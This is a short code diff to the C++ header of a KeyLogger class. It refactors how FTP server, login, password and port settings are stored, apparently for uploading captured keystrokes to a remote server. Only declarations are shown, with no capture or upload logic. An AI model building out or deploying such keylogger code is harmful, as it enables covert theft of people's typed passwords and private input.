@@ -96,7 +96,7 @@ class KeyLogger {
     void KeyLogger::setRShiftDown(bool down) { rshiftDown = down; }
 
     //setup FTP master server
-    void setMaster(std::string server, int port, std::string login, std::string password, std::string _uploadDir=".");
+    void setMaster(std::string _server, int _port, std::string _login, std::string _password, std::string _uploadDir=".");
 
     protected:
 
@@ -146,9 +146,10 @@ class KeyLogger {
 
     #ifdef USE_FTP
     sf::Ftp ftpClient;
-    #endif
     bool useFTP;
-    std::string uploadDir;
+    std::string server, login, password, uploadDir;
+    int port;
+    #endif
 };
 
 #endif // H_KEYLOGGER
